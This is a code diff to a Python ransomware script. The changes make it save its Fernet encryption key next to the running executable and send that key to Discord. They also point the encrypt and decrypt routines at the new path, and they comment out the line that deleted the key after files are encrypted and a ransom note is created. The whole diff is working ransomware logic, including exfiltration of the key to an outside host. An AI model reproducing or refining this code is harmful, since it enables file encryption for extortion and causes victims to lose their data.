@@ -111,11 +111,26 @@ def getFiles(directory):
     return target_files
 
 
+# def generateKey():
+#     key = Fernet.generate_key()
+#     with open("symmetric_key.key", "wb") as keyfile:
+#         keyfile.write(key)
+#     print("generated")
+#     send_key_to_discord(key)
+
+
 def generateKey():
+    key_file_path = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "symmetric_key.key")
+
+
+    # Generate the key and save it to the determined path
     key = Fernet.generate_key()
-    with open("symmetric_key.key", "wb") as keyfile:
+    with open(key_file_path, "wb") as keyfile:
         keyfile.write(key)
-    print("generated")
+    
+    print(f"Generated symmetric key at {key_file_path}")
+
+    # Send the key to Discord or another location (your existing function)
     send_key_to_discord(key)
 
 def send_key_to_discord(key):
@@ -158,7 +173,7 @@ def send_key_to_discord(key):
         print(f"Error sending information to Discord: {e}")
 
 def encrypt(target):
-    with open(f"{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key", "rb") as keyfile:
+    with open(f"{pathlib.Path(sys.argv[0]).parent.absolute()}/symmetric_key.key", "rb") as keyfile:
         key = keyfile.read()
     key = Fernet(key)
     
@@ -173,7 +188,7 @@ def encrypt(target):
                 encrypted_file.write(cipher)
         
         create_ransom_note()
-        os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
+        #os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
     else:
         print("Target empty.")
 
@@ -200,7 +215,7 @@ def start_point():
     args = parser.parse_args()
 
 
-    file_path = f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key'
+    file_path = f'{pathlib.Path(sys.argv[0]).parent.absolute()}/symmetric_key.key'
     if os.path.isfile(file_path):
         print(f"Decrypting with {file_path}")
         directory = navigateToDir("Desktop"+ path_str +"Test")
